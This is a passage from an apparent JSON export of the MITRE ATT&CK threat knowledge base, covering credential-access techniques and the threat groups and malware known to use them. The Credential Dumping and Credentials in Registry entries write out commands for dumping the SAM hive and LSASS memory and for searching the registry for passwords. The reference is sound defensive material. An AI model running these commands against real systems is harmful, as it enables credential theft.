                    "Description": "The \"tDiscoverer\" variant of HAMMERTOSS establishes a C2 channel by downloading resources from Web services like Twitter and GitHub. HAMMERTOSS binaries contain an algorithm that generates a different Twitter handle for the malware to check for instructions every day.[17]"
                },
                {
                    "Name": "KARAE",
                    "Description": "KARAE can use public cloud-based storage providers for command and control.[1]"
                },
                {
                    "Name": "Kazuar",
                    "Description": "Kazuar has used compromised WordPress blogs as C2 servers.[18]"
                },
                {
                    "Name": "Leviathan",
                    "Description": "Leviathan has received C2 instructions from user profiles created on legitimate websites such as Github and TechNet.[7]"
                },
                {
                    "Name": "LOWBALL",
                    "Description": "LOWBALL uses the Dropbox cloud storage service for command and control.[19]"
                },
                {
                    "Name": "Magic Hound",
                    "Description": "Magic Hound malware can use a SOAP Web service to communicate with its C2 server.[20]"
                },
                {
                    "Name": "MiniDuke",
                    "Description": "Some MiniDuke components use Twitter to initially obtain the address of a C2 server or as a backup if no hard-coded C2 server responds.[12][21]"
                },
                {
                    "Name": "OnionDuke",
                    "Description": "OnionDuke uses Twitter as a backup C2 method. It also has a module designed to post messages to the Russian VKontakte social media site.[12]"
                },
                {
                    "Name": "Orz",
                    "Description": "Orz has used Technet and Pastebin web pages for command and control.[22]"
                },
                {
                    "Name": "Patchwork",
                    "Description": "Patchwork hides base64-encoded and encrypted C2 server locations in comments on legitimate websites.[23]"
                },
                {
                    "Name": "PlugX",
                    "Description": "PlugX uses Pastebin to store its real C2 addresses.[24]"
                },
                {
                    "Name": "POORAIM",
                    "Description": "POORAIM has used AOL Instant Messenger for C2.[1]"
                },
                {
                    "Name": "ROKRAT",
                    "Description": "ROKRAT leverages legitimate social networking sites and cloud platforms (Twitter, Yandex, and Mediafire) for command and control communications.[25]"
                },
                {
                    "Name": "RTM",
                    "Description": "RTM has used an RSS feed on Livejournal to update a list of encrypted C2 server names.[26]"
                },
                {
                    "Name": "SLOWDRIFT",
                    "Description": "SLOWDRIFT uses cloud based services for C2.[1]"
                },
                {
                    "Name": "Turla",
                    "Description": "A Turla JavaScript backdoor has used Google Apps Script as its C2 server.[27][28]"
                },
                {
                    "Name": "yty",
                    "Description": "yty communicates to the C2 server by retrieving a Google Doc.[29]"
                }
            ]
        },
        "Bash History": {
            "Name": "Bash History",
            "Description": "Bash keeps track of the commands users type on the command-line with the \"history\" utility. Once a user logs out, the history is flushed to the user’s .bash_history file. For each user, this file resides at the same location: ~/.bash_history. Typically, this file keeps track of the user’s last 500 commands. Users often type usernames and passwords on the command-line as parameters to programs, which then get saved to this file when they log out. Attackers can abuse this by looking through the file for potential credentials. [1]\n",
            "ID": "T1139",
            "Tactic": "Credential Access",
            "Platform: ": "Linux, macOS",
            "Permissions Required: ": "User",
            "Data Sources: ": "File monitoring, Process monitoring, Process command-line parameters",
            "Version": "1.0"
        },
        "Brute Force": {
            "Name": "Brute Force",
            "Description": "Adversaries may use brute force techniques to attempt access to accounts when passwords are unknown or when password hashes are obtained.Credential Dumping to obtain password hashes may only get an adversary so far when Pass the Hash is not an option. Techniques to systematically guess the passwords used to compute hashes are available, or the adversary may use a pre-computed rainbow table. Cracking hashes is usually done on adversary-controlled systems outside of the target network. [1]Adversaries may attempt to brute force logins without knowledge of passwords or hashes during an operation either with zero knowledge or by attempting a list of known or possible passwords. This is a riskier option because it could cause numerous authentication failures and account lockouts, depending on the organization's login failure policies. [2]A related technique called password spraying uses one password, or a small list of passwords, that matches the complexity policy of the domain and may be a commonly used password. Logins are attempted with that password and many different accounts on a network to avoid account lockouts that would normally occur when brute forcing a single account with many passwords. [3]\n",
            "ID": "T1110",
            "Tactic": "Credential Access",
            "Platform: ": "Linux, macOS, Windows",
            "Permissions Required: ": "User",
            "Data Sources: ": "Authentication logs",
            "Contributors: ": "John Strand",
            "Version": "1.0",
            "Examples": [
                {
                    "Name": "APT3",
                    "Description": "APT3 has been known to brute force password hashes to be able to leverage plain text credentials.[4]"
                },
                {
                    "Name": "Chaos",
                    "Description": "Chaos conducts brute force attacks against SSH services to gain initial access.[5]"
                },
                {
                    "Name": "Dragonfly 2.0",
                    "Description": "Dragonfly 2.0 dropped and executed tools used for password cracking, including Hydra.[6][7][8]"
                },
                {
                    "Name": "Lazarus Group",
                    "Description": "Lazarus Group malware attempts to connect to Windows shares for lateral movement by using a generated list of usernames, which center around permutations of the username Administrator, and weak passwords.[9][10]"
                },
                {
                    "Name": "Leafminer",
                    "Description": "Leafminer used a tool called BruteForcer to perform a brute force attack.[11]"
                },
                {
                    "Name": "Net Crawler",
                    "Description": "Net Crawler uses a list of known credentials gathered through credential dumping to guess passwords to accounts as it spreads throughout a network.[2]"
                },
                {
                    "Name": "OilRig",
                    "Description": "OilRig has used brute force techniques to obtain credentials.[12]"
                },
                {
                    "Name": "Turla",
                    "Description": "Turla may attempt to connect to systems within a victim's network using net use commands and a predefined list or collection of passwords.[13]"
                }
            ]
        },
        "Credential Dumping": {
            "Name": "Credential Dumping",
            "Description": "Credential dumping is the process of obtaining account login and password information, normally in the form of a hash or a clear text password, from the operating system and software. Credentials can then be used to perform Lateral Movement and access restricted information.Several of the tools mentioned in this technique may be used by both adversaries and professional security testers. Additional custom tools likely exist as well.WindowsSAM (Security Accounts Manager)The SAM is a database file that contains local accounts for the host, typically those found with the ‘net user’ command. To enumerate the SAM database, system level access is required. A number of tools can be used to retrieve the SAM file through in-memory techniques:pwdumpx.exe gsecdumpMimikatzsecretsdump.pyAlternatively, the SAM can be extracted from the Registry with Reg:reg save HKLM\\sam samreg save HKLM\\system systemCreddump7 can then be used to process the SAM database locally to retrieve hashes. [1]Notes:Rid 500 account is the local, in-built administrator.Rid 501 is the guest account.User accounts start with a RID of 1,000+.Cached CredentialsThe DCC2 (Domain Cached Credentials version 2) hash, used by Windows Vista and newer caches credentials when the domain controller is unavailable. The number of default cached credentials varies, and this number can be altered per system. This hash does not allow pass-the-hash style attacks. A number of tools can be used to retrieve the SAM file through in-memory techniques.pwdumpx.exe gsecdumpMimikatzAlternatively, reg.exe can be used to extract from the Registry and Creddump7 used to gather the credentials.Notes:Cached credentials for Windows Vista are derived using PBKDF2.Local Security Authority (LSA) SecretsWith SYSTEM access to a host, the LSA secrets often allows trivial access from a local account to domain-based account credentials. The Registry is used to store the LSA secrets. When services are run under the context of local or domain users, their passwords are stored in the Registry. If auto-logon is enabled, this information will be stored in the Registry as well. A number of tools can be used to retrieve the SAM file through in-memory techniques.pwdumpx.exe gsecdumpMimikatzsecretsdump.pyAlternatively, reg.exe can be used to extract from the Registry and Creddump7 used to gather the credentials.Notes:The passwords extracted by his mechanism are UTF-16 encoded, which means that they are returned in plaintext.Windows 10 adds protections for LSA Secrets described in Mitigation.NTDS from Domain ControllerActive Directory stores information about members of the domain including devices and users to verify credentials and define access rights. The Active Directory domain database is stored in the NTDS.dit file. By default the NTDS file will be located in %SystemRoot%\\NTDS\\Ntds.dit of a domain controller. [2]The following tools and techniques can be used to enumerate the NTDS file and the contents of the entire Active Directory hashes.Volume Shadow Copysecretsdump.pyUsing the in-built Windows tool, ntdsutil.exeInvoke-NinjaCopyGroup Policy Preference (GPP) FilesGroup Policy Preferences (GPP) are tools that allowed administrators to create domain policies with embedded credentials. These policies, amongst other things, allow administrators to set local accounts.These group policies are stored in SYSVOL on a domain controller, this means that any domain user can view the SYSVOL share and decrypt the password (the AES private key was leaked on-line. [3] [4]The following tools and scripts can be used to gather and decrypt the password file from Group Policy Preference XML files:Metasploit’s post exploitation module: \"post/windows/gather/credentials/gpp\"Get-GPPPassword [5]gpprefdecrypt.pyNotes:On the SYSVOL share, the following can be used to enumerate potential XML files.dir /s * .xmlService Principal Names (SPNs)See Kerberoasting.Plaintext CredentialsAfter a user logs on to a system, a variety of credentials are generated and stored in the Local Security Authority Subsystem Service (LSASS) process in memory. These credentials can be harvested by a administrative user or SYSTEM.SSPI (Security Support Provider Interface) functions as a common interface to several Security Support Providers (SSPs): A Security Support Provider is a dynamic-link library (DLL) that makes one or more security packages available to applications.The following SSPs can be used to access credentials:Msv: Interactive logons, batch logons, and service logons are done through the MSV authentication package.Wdigest: The Digest Authentication protocol is designed for use with Hypertext Transfer Protocol (HTTP) and Simple Authentication Security Layer (SASL) exchanges. [6]Kerberos: Preferred for mutual client-server domain authentication in Windows 2000 and later.CredSSP:  Provides SSO and Network Level Authentication for Remote Desktop Services. [7] The following tools can be used to enumerate credentials:Windows Credential EditorMimikatzAs well as in-memory techniques, the LSASS process memory can be dumped from the target host and analyzed on a local system.For example, on the target host use procdump:* procdump -ma lsass.exe lsass_dumpLocally, mimikatz can be run:sekurlsa::Minidump lsassdump.dmpsekurlsa::logonPasswordsDCSyncDCSync is a variation on credential dumping which can be used to acquire sensitive information from a domain controller. Rather than executing recognizable malicious code, the action works by abusing the domain controller's  application programming interface (API) [8] [9] [10] [11] to simulate the replication process from a remote domain controller. Any members of the Administrators, Domain Admins, Enterprise Admin groups or computer accounts on the domain controller are able to run DCSync to pull password data [12] from Active Directory, which may include current and historical hashes of potentially useful accounts such as KRBTGT and Administrators. The hashes can then in turn be used to create a Golden Ticket for use in Pass the Ticket [13] or change an account's password as noted in Account Manipulation. [14] DCSync functionality has been included in the \"lsadump\" module in Mimikatz. [15] Lsadump also includes NetSync, which performs DCSync over a legacy replication protocol. [16]LinuxProc filesystemThe /proc filesystem on Linux contains a great deal of information regarding the state of the running operating system. Processes running with root privileges can use this facility to scrape live memory of other running programs. If any of these programs store passwords in clear text or password hashes in memory, these values can then be harvested for either usage or brute force attacks, respectively. This functionality has been implemented in the MimiPenguin, an open source tool inspired by Mimikatz. The tool dumps process memory, then harvests passwords and hashes by looking for text strings and regex patterns for how given applications such as Gnome Keyring, sshd, and Apache use memory to store such authentication artifacts.\n",
            "ID": "T1003",
            "Tactic": "Credential Access",
            "Platform: ": "Windows, Linux, macOS",
            "Permissions Required: ": "Administrator, SYSTEM, root",
            "Data Sources: ": "API monitoring, Process monitoring, PowerShell logs, Process command-line parameters",
            "CAPEC ID: ": "CAPEC-567",
            "Contributors: ": "Vincent Le Toux; Ed Williams, Trustwave, SpiderLabs",
            "Version": "1.0",
            "Examples": [
                {
                    "Name": "APT1",
                    "Description": "APT1 has been known to use credential dumping.[17]"
                },
                {
                    "Name": "APT28",
                    "Description": "APT28 regularly deploys both publicly available and custom password retrieval tools on victims.[18][19]"
                },
                {
                    "Name": "APT3",
                    "Description": "APT3 has used a tool to dump credentials by injecting itself into lsass.exe and triggering with the argument \"dig.\" The group has also used a tools to dump passwords from browsers.[20]"
                },
                {
                    "Name": "APT37",
                    "Description": "APT37 has used a credential stealer known as ZUMKONG that can harvest usernames and passwords stored in browsers.[21]"
                },
                {
                    "Name": "Axiom",
                    "Description": "Axiom has been known to dump credentials.[22]"
                },
                {
                    "Name": "Backdoor.Oldrea",
                    "Description": "Some Backdoor.Oldrea samples contain a publicly available Web browser password recovery tool.[23]"
                },
                {
                    "Name": "BRONZE BUTLER",
                    "Description": "BRONZE BUTLER has used various tools to perform credential dumping.[24]"
                },
                {
                    "Name": "Cachedump",
                    "Description": "Cachedump can extract cached password hashes from a system’s registry.[17]"
                },
                {
                    "Name": "Carbanak",
                    "Description": "Carbanak obtains Windows logon password details.[25]"
                },
                {
                    "Name": "ChChes",
                    "Description": "ChChes steals credentials stored inside Internet Explorer.[26]"
                },
                {
                    "Name": "Cleaver",
                    "Description": "Cleaver has been known to dump credentials.[27]"
                },
                {
                    "Name": "Cobalt Strike",
                    "Description": "Cobalt Strike can recover hashed passwords.[28]"
                },
                {
                    "Name": "CosmicDuke",
                    "Description": "CosmicDuke collects user credentials, including passwords, for various programs and browsers, including popular instant messaging applications, Web browsers, and email clients. Windows account hashes, domain accounts, and LSA secrets are also collected, as are WLAN keys.[29]"
                },
                {
                    "Name": "CozyCar",
                    "Description": "Password stealer and NTLM stealer modules in CozyCar harvest stored credentials from the victim, including credentials used as part of Windows NTLM user authentication. CozyCar has also executed Mimikatz for further victim penetration.[30]"
                },
                {
                    "Name": "Crimson",
                    "Description": "Crimson contains a module to steal credentials from Web browsers on the victim machine.[31]"
                },
                {
                    "Name": "Daserf",
                    "Description": "Daserf leverages Mimikatz and Windows Credential Editor to steal credentials.[32]"
                },
                {
                    "Name": "Dragonfly 2.0",
                    "Description": "Dragonfly 2.0 dropped and executed SecretsDump and CrackMapExec, tools that can dump password hashes.[33][34][35]"
                },
                {
                    "Name": "Fgdump",
                    "Description": "Fgdump can dump Windows password hashes.[17]"
                },
                {
                    "Name": "FIN5",
                    "Description": "FIN5 has dumped credentials from victims. Specifically, the group has used the tool GET5 Penetrator to look for remote login and hard-coded credentials.[36][37]"
                },
                {
                    "Name": "FIN6",
                    "Description": "FIN6 has used Windows Credential Editor for credential dumping, as well as Metasploit’s PsExec NTDSGRAB module to obtain a copy of the victim's Active Directory database.[38]"
                },
                {
                    "Name": "FIN8",
                    "Description": "FIN8 harvests credentials using Invoke-Mimikatz or Windows Credentials Editor (WCE).[39]"
                },
                {
                    "Name": "gsecdump",
                    "Description": "gsecdump can dump Windows password hashes and LSA secrets.[40]"
                },
                {
                    "Name": "H1N1",
                    "Description": "H1N1 dumps usernames and passwords from Firefox, Internet Explorer, and Outlook.[41]"
                },
                {
                    "Name": "HOMEFRY",
                    "Description": "can perform credential dumping.[42]"
                },
                {
                    "Name": "Ke3chang",
                    "Description": "Ke3chang has dumped credentials, including by using Mimikatz.[43][44]"
                },
                {
                    "Name": "Koadic",
                    "Description": "Koadic can gather hashed passwords by dumping SAM/SECURITY hive and gathers domain controller hashes from NTDS.[45]"
                },
                {
                    "Name": "Lazarus Group",
                    "Description": "Lazarus Group leveraged Mimikatz to extract Windows Credentials of currently logged-in users and steals passwords stored in browsers.[46]"
                },
                {
                    "Name": "Leafminer",
                    "Description": "Leafminer leveraged the tool LaZagne for retrieving login and password information.[47]"
                },
                {
                    "Name": "Lslsass",
                    "Description": "Lslsass can dump active logon session password hashes from the lsass process.[17]"
                },
                {
                    "Name": "Magic Hound",
                    "Description": "Magic Hound stole domain credentials from Microsoft Active Directory Domain Controller and leveraged Mimikatz.[48]"
                },
                {
                    "Name": "Matroyshka",
                    "Description": "Matroyshka is capable of stealing Outlook passwords.[49][50]"
                },
                {
                    "Name": "menuPass",
                    "Description": "menuPass has used a modified version of pentesting tools wmiexec.vbs and secretsdump.py to dump credentials.[26][51]"
                },
                {
                    "Name": "Mimikatz",
                    "Description": "Mimikatz performs credential dumping to obtain account and password information useful in gaining access to additional systems and enterprise network resources. It contains functionality to acquire information about credentials in many ways, including from the LSA, SAM table, credential vault, DCSync/NetSync, and DPAPI.[52][15][53]"
                },
                {
                    "Name": "MimiPenguin",
                    "Description": "MimiPenguin can dump process memory and extract clear-text credentials.[54]"
                },
                {
                    "Name": "Mivast",
                    "Description": "Mivast has the capability to gather NTLM password information.[55]"
                },
                {
                    "Name": "Molerats",
                    "Description": "Molerats used the public tool BrowserPasswordDump10 to dump passwords saved in browsers on victims.[56]"
                },
                {
                    "Name": "MuddyWater",
                    "Description": "MuddyWater has performed credential dumping with Mimikatz and Lazagne.[57]"
                },
                {
                    "Name": "Net Crawler",
                    "Description": "Net Crawler uses credential dumpers such as Mimikatz and Windows Credential Editor to extract cached credentials from Windows systems.[27]"
                },
                {
                    "Name": "OilRig",
                    "Description": "OilRig has used credential dumping tools such as Mimikatz and Lazagne to steal credentials to accounts logged into the compromised system and to Outlook Web Access.[58][59]"
                },
                {
                    "Name": "OLDBAIT",
                    "Description": "OLDBAIT collects credentials from Internet Explorer, Mozilla Firefox, Eudora, and several email clients.[60]"
                },
                {
                    "Name": "OnionDuke",
                    "Description": "OnionDuke steals credentials from its victims.[29]"
                },
                {
                    "Name": "Patchwork",
                    "Description": "Patchwork dumped the login data database from \\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Login Data.[61]"
                },
                {
                    "Name": "PinchDuke",
                    "Description": "PinchDuke steals credentials from compromised hosts. PinchDuke's credential stealing functionality is believed to be based on the source code of the Pinch credential stealing malware (also known as LdPinch). Credentials targeted by PinchDuke include ones associated with The Bat!, Yahoo!, Mail.ru, Passport.Net, Google Talk, Netscape Navigator, Mozilla Firefox, Mozilla Thunderbird, Internet Explorer, Microsoft Outlook, WinInet Credential Cache, and Lightweight Directory Access Protocol (LDAP).[29]"
                },
                {
                    "Name": "PLATINUM",
                    "Description": "PLATINUM has used keyloggers that are also capable of dumping credentials.[62]"
                },
                {
                    "Name": "Poseidon Group",
                    "Description": "Poseidon Group conducts credential dumping on victims, with a focus on obtaining credentials belonging to domain and database servers.[63]"
                },
                {
                    "Name": "PowerSploit",
                    "Description": "PowerSploit contains a collection of Exfiltration modules that can harvest credentials from Group Policy Preferences, Windows vault credential objects, or using Mimikatz.[64][65]"
                },
                {
                    "Name": "Prikormka",
                    "Description": "A module in Prikormka collects passwords stored in applications installed on the victim.[66]"
                },
                {
                    "Name": "Pupy",
                    "Description": "Pupy executes Mimikatz using PowerShell and can also perform pass-the-ticket and use Lazagne for harvesting credentials.[67]"
                },
                {
                    "Name": "pwdump",
                    "Description": "pwdump can be used to dump credentials.[68]"
                },
                {
                    "Name": "QuasarRAT",
                    "Description": "QuasarRAT can obtain passwords from common browsers and FTP clients.[69][70]"
                },
                {
                    "Name": "RedLeaves",
                    "Description": "RedLeaves can gather browser usernames and passwords.[71]"
                },
                {
                    "Name": "Remsec",
                    "Description": "Remsec can dump the SAM database.[72]"
                },
                {
                    "Name": "ROKRAT",
                    "Description": "ROKRAT steals credentials stored in Web browsers by querying the sqlite database and leveraging the Windows Vault mechanism.[73]"
                },
                {
                    "Name": "Sowbug",
                    "Description": "Sowbug has used credential dumping tools.[74]"
                },
                {
                    "Name": "Stealth Falcon",
                    "Description": "Stealth Falcon malware gathers passwords from multiple sources, including Windows Credential Vault, Internet Explorer, Firefox, Chrome, and Outlook.[75]"
                },
                {
                    "Name": "Strider",
                    "Description": "Strider has registered its persistence module on domain controllers as a Windows LSA (Local System Authority) password filter to dump credentials any time a domain, local user, or administrator logs in or changes a password.[76]"
                },
                {
                    "Name": "Suckfly",
                    "Description": "Suckfly used a signed credential-dumping tool to obtain victim account credentials.[77]"
                },
                {
                    "Name": "Threat Group-3390",
                    "Description": "Threat Group-3390 actors have used gsecdump and a modified version of Mimikatz called Wrapikatz to dump credentials. They have also dumped credentials from domain controllers.[78][79]"
                },
                {
                    "Name": "Trojan.Karagany",
                    "Description": "Trojan.Karagany can dump passwords and save them into \\ProgramData\\Mail\\MailAg\\pwds.txt.[23]"
                },
                {
                    "Name": "Unknown Logger",
                    "Description": "Unknown Logger is capable of stealing usernames and passwords from browsers on the victim machine.[80]"
                },
                {
                    "Name": "Windows Credential Editor",
                    "Description": "Windows Credential Editor can dump credentials.[81]"
                }
            ]
        },
        "Credentials in Files": {
            "Name": "Credentials in Files",
            "Description": "Adversaries may search local file systems and remote file shares for files containing passwords. These can be files created by users to store their own credentials, shared credential stores for a group of individuals, configuration files containing passwords for a system or service, or source code/binary files containing embedded passwords.It is possible to extract passwords from backups or saved virtual machines through Credential Dumping. [1] Passwords may also be obtained from Group Policy Preferences stored on the Windows Domain Controller. [2]\n",
            "ID": "T1081",
            "Tactic": "Credential Access",
            "Platform: ": "Linux, macOS, Windows",
            "Permissions Required: ": "User, Administrator, SYSTEM",
            "Data Sources: ": "File monitoring, Process command-line parameters",
            "CAPEC ID: ": "CAPEC-545",
            "Version": "1.0",
            "Examples": [
                {
                    "Name": "APT3",
                    "Description": "APT3 has a tool that can locate credentials in files on the file system such as those from Firefox or Chrome.[3]"
                },
                {
                    "Name": "BlackEnergy",
                    "Description": "BlackEnergy has used a plug-in to gather credentials stored in files on the host by various software programs, including The Bat! email client, Mozilla password manager, Google Chrome password manager, Outlook, Internet Explorer, and Windows Credential Store.[4][5]"
                },
                {
                    "Name": "Mimikatz",
                    "Description": "Mimikatz's DPAPI module can harvest protected credentials stored and/or cached by browsers and other user applications by interacting with Windows cryptographic application programming interface (API) functions.[6][7]"
                },
                {
                    "Name": "pngdowner",
                    "Description": "If an initial connectivity check fails, pngdowner attempts to extract proxy details and credentials from Windows Protected Storage and from the IE Credentials Store. This allows the adversary to use the proxy credentials for subsequent requests if they enable outbound HTTP access.[8]"
                },
                {
                    "Name": "Prikormka",
                    "Description": "A module in Prikormka gathers logins and passwords stored in applications on the victims, including Google Chrome, Mozilla Firefox, and several other browsers.[9]"
                },
                {
                    "Name": "Proton",
                    "Description": "Proton gathers credentials in files for chrome, 1password, and keychains.[10]"
                },
                {
                    "Name": "QuasarRAT",
                    "Description": "QuasarRAT can obtain passwords from common browsers and FTP clients.[11][12]"
                },
                {
                    "Name": "Smoke Loader",
                    "Description": "Smoke Loader searches for files named logins.json to parse for credentials and also looks for credentials stored from browsers.[13]"
                },
                {
                    "Name": "XAgentOSX",
                    "Description": "XAgentOSX contains the getFirefoxPassword function to attempt to locate Firefox passwords.[14]"
                },
                {
                    "Name": "XTunnel",
                    "Description": "XTunnel is capable of accessing locally stored passwords on victims.[15]"
                }
            ]
        },
        "Credentials in Registry": {
            "Name": "Credentials in Registry",
            "Description": "The Windows Registry stores configuration information that can be used by the system or other programs. Adversaries may query the Registry looking for credentials and passwords that have been stored for use by other programs or services. Sometimes these credentials are used for automatic logons.Example commands to find Registry keys related to password information: [1]Local Machine Hive: reg query HKLM /f password /t REG_SZ /sCurrent User Hive: reg query HKCU /f password /t REG_SZ /s\n",
            "ID": "T1214",
            "Tactic": "Credential Access",
            "Platform: ": "Windows",
            "Permissions Required: ": "User, Administrator",
            "Data Sources: ": "Windows Registry, Process command-line parameters, Process monitoring",
            "Contributors: ": "Sudhanshu Chauhan, @Sudhanshu_C",
            "Version": "1.0",
            "Examples": [
                {
                    "Name": "PowerSploit",
                    "Description": "PowerSploit has several modules that search the Windows Registry for stored credentials: Get-UnattendedInstallFile, Get-Webconfig, Get-ApplicationHost, Get-SiteListPassword, Get-CachedGPPPassword, and Get-RegistryAutoLogon.[1]"
                },
                {
                    "Name": "Reg",
                    "Description": "Reg may be used to find credentials in the Windows Registry.[1]"
                }
            ]
        },
        "Exploitation for Credential Access": {
            "Name": "Exploitation for Credential Access",
            "Description": "Exploitation of a software vulnerability occurs when an adversary takes advantage of a programming error in a program, service, or within the operating system software or kernel itself to execute adversary-controlled code. Credentialing and authentication mechanisms may be targeted for exploitation by adversaries as a means to gain access to useful credentials or circumvent the process to gain access to systems. One example of this is MS14-068, which targets Kerberos and can be used to forge Kerberos tickets using domain user permissions. [1] [2] Exploitation for credential access may also result in Privilege Escalation depending on the process targeted or credentials obtained.\n",
            "ID": "T1212",
            "Tactic": "Credential Access",
            "Platform: ": "Linux, Windows, macOS",
            "Permissions Required: ": "User",
            "Data Sources: ": "Authentication logs, Windows Error Reporting, Process monitoring",
            "Contributors: ": "John Lambert, Microsoft Threat Intelligence Center",
            "Version": "1.0"
        },
        "Forced Authentication": {
            "Name": "Forced Authentication",
            "Description": "The Server Message Block (SMB) protocol is commonly used in Windows networks for authentication and communication between systems for access to resources and file sharing. When a Windows system attempts to connect to an SMB resource it will automatically attempt to authenticate and send credential information for the current user to the remote system. [1] This behavior is typical in enterprise environments so that users do not need to enter credentials to access network resources. Web Distributed Authoring and Versioning (WebDAV) is typically used by Windows systems as a backup protocol when SMB is blocked or fails. WebDAV is an extension of HTTP and will typically operate over TCP ports 80 and 443. [2] [3]Adversaries may take advantage of this behavior to gain access to user account hashes through forced SMB authentication. An adversary can send an attachment to a user through spearphishing that contains a resource link to an external server controlled by the adversary (i.e. Template Injection), or place a specially crafted file on navigation path for privileged accounts (e.g. .SCF file placed on desktop) or on a publicly accessible share to be accessed by victim(s). When the user's system accesses the untrusted resource it will attempt authentication and send information including the user's hashed credentials over SMB to the adversary controlled server. [4] With access to the credential hash, an adversary can perform off-line Brute Force cracking to gain access to plaintext credentials, or reuse it for Pass the Hash. [5]There are several different ways this can occur. [6] Some specifics from in-the-wild use include:A spearphishing attachment containing a document with a resource that is automatically loaded when the document is opened (i.e. Template Injection). The document can include, for example, a request similar to file[:]//[remote address]/Normal.dotm to trigger the SMB request. [7]A modified .LNK or .SCF file with the icon filename pointing to an external reference such as \\[remote address]\\pic.png that will force the system to load the resource when the icon is rendered to repeatedly gather credentials. [7]\n",
            "ID": "T1187",
            "Tactic": "Credential Access",
            "Platform: ": "Windows",
            "Permissions Required: ": "User",
            "Data Sources: ": "File monitoring, Network protocol analysis, Network device logs, Process use of network",
            "Contributors: ": "Teodor Cimpoesu; Sudhanshu Chauhan, @Sudhanshu_C",
            "Version": "1.0",
            "Examples": [
                {
                    "Name": "DarkHydrus",
                    "Description": "DarkHydrus used Template Injection to launch an authentication window for users to enter their credentials.[8]"
                },
                {
                    "Name": "Dragonfly 2.0",
                    "Description": "Dragonfly 2.0 has gathered hashed user credentials over SMB using spearphishing attachments with external resource links and by modifying .LNK file icon resources to collect credentials from virtualized systems.[9][7]"
                }
            ]
        },
        "Input Capture": {
            "Name": "Input Capture",
            "Description": "Adversaries can use methods of capturing user input for obtaining credentials for Valid Accounts and information Collection that include keylogging and user input field interception.Keylogging is the most prevalent type of input capture, with many different ways of intercepting keystrokes, [1] but other methods exist to target information for specific purposes, such as performing a UAC prompt or wrapping the Windows default credential provider. [2]Keylogging is likely to be used to acquire credentials for new access opportunities when Credential Dumping efforts are not effective, and may require an adversary to remain passive on a system for a period of time before an opportunity arises.Adversaries may also install code on externally facing portals, such as a VPN login page, to capture and transmit credentials of users who attempt to log into the service. This variation on input capture may be conducted post-compromise using legitimate administrative access as a backup measure to maintain network access through External Remote Services and Valid Accounts or as part of the initial compromise by exploitation of the externally facing web service. [3]\n",
            "ID": "T1056",
            "Tactic": "Collection, Credential Access",
            "Platform: ": "Linux, macOS, Windows",
            "Permissions Required: ": "Administrator, SYSTEM",
            "Data Sources: ": "Windows Registry, Kernel drivers, Process monitoring, API monitoring",
            "CAPEC ID: ": "CAPEC-569",
            "Contributors: ": "John Lambert, Microsoft Threat Intelligence Center",
            "Version": "1.0",
            "Examples": [
                {
                    "Name": "ADVSTORESHELL",
                    "Description": "ADVSTORESHELL can perform keylogging.[4][5]"
                },
                {
                    "Name": "APT28",
                    "Description": "APT28 has used tools to perform keylogging.[6][7]"
                },
                {
                    "Name": "APT3",
                    "Description": "APT3 has used a keylogging tool that records keystrokes in encrypted files.[8]"
                },
                {
                    "Name": "BADNEWS",
                    "Description": "When it first starts, BADNEWS spawns a new thread to log keystrokes.[9][10][11]"
                },
                {
                    "Name": "Bandook",
                    "Description": "Bandook contains keylogging capabilities[12]"
                },
                {
                    "Name": "BlackEnergy",
                    "Description": "BlackEnergy has run a keylogger plug-in on a victim.[13]"
                },
                {
                    "Name": "Carbanak",
                    "Description": "Carbanak logs key strokes for configured processes and sends them back to the C2 server.[14][15]"
                },
                {
                    "Name": "Catchamas",
                    "Description": "Catchamas collects keystrokes from the victim’s machine.[16]"
                },
                {
                    "Name": "CHOPSTICK",
                    "Description": "CHOPSTICK is capable of performing keylogging.[17][4][7]"
                },
                {
                    "Name": "Cobalt Strike",
                    "Description": "Cobalt Strike can track key presses with a keylogger module.[18]"
                },
                {
                    "Name": "CosmicDuke",
                    "Description": "CosmicDuke uses a keylogger and steals clipboard contents from victims.[19]"
                },
                {
                    "Name": "Darkhotel",
                    "Description": "Darkhotel uses a sophisticated keylogger.[20]"
                },
                {
                    "Name": "Daserf",
                    "Description": "Daserf can log keystrokes.[21][22]"
                },
                {
                    "Name": "Derusbi",
                    "Description": "Derusbi is capable of logging keystrokes.[23]"
                },
                {
                    "Name": "DOGCALL",
                    "Description": "DOGCALL is capable of logging keystrokes.[24]"
                },
                {
                    "Name": "Duqu",
                    "Description": "Duqu can track key presses with a keylogger module.[25]"
                },
                {
                    "Name": "DustySky",
                    "Description": "DustySky contains a keylogger.[26]"
                },
                {
                    "Name": "EvilGrab",
                    "Description": "EvilGrab has the capability to capture keystrokes.[27]"
                },
                {
                    "Name": "FakeM",
                    "Description": "FakeM contains a keylogger module.[28]"
                },
                {
                    "Name": "gh0st",
                    "Description": "The gh0st RAT has a keylogger.[29]"
                },
                {
                    "Name": "Group5",
                    "Description": "Malware used by Group5 is capable of capturing keystrokes.[30]"
                },
                {
                    "Name": "Helminth",
                    "Description": "The executable version of Helminth has a module to log keystrokes.[31]"
                },
                {
                    "Name": "HTTPBrowser",
                    "Description": "HTTPBrowser is capable of capturing keystrokes on victims.[32]"
                },
                {
                    "Name": "JPIN",
                    "Description": "JPIN contains a custom keylogger.[33]"
                },
                {
                    "Name": "jRAT",
                    "Description": "jRAT has the capability to log keystrokes from the victim’s machine.[34]"
                },
                {
                    "Name": "Kasidet",
                    "Description": "Kasidet has the ability to initiate keylogging.[35]"
                },
                {
                    "Name": "Ke3chang",
                    "Description": "Ke3chang has used keyloggers.[36]"
                },
                {
                    "Name": "Lazarus Group",
                    "Description": "Lazarus Group malware KiloAlfa contains keylogging functionality.[37][38]"
                },
                {
                    "Name": "MacSpy",
                    "Description": "MacSpy captures keystrokes.[39]"
                },
                {
                    "Name": "Magic Hound",
                    "Description": "Magic Hound malware is capable of keylogging.[40]"
                },
                {
                    "Name": "Matroyshka",
                    "Description": "Matroyshka is capable of keylogging.[41][42]"
                },
                {
                    "Name": "MoonWind",
                    "Description": "MoonWind has a keylogger.[43]"
                },
                {
                    "Name": "NavRAT",
                    "Description": "NavRAT logs the keystrokes on the targeted system.[44]"
                },
                {
                    "Name": "NetTraveler",
                    "Description": "NetTraveler contains a keylogger.[45]"
                },
                {
                    "Name": "NETWIRE",
                    "Description": "NETWIRE can perform keylogging.[46][47]"
                },
                {
                    "Name": "OilRig",
                    "Description": "OilRig has used a keylogging tool called KEYPUNCH.[48]"
                },
                {
                    "Name": "OwaAuth",
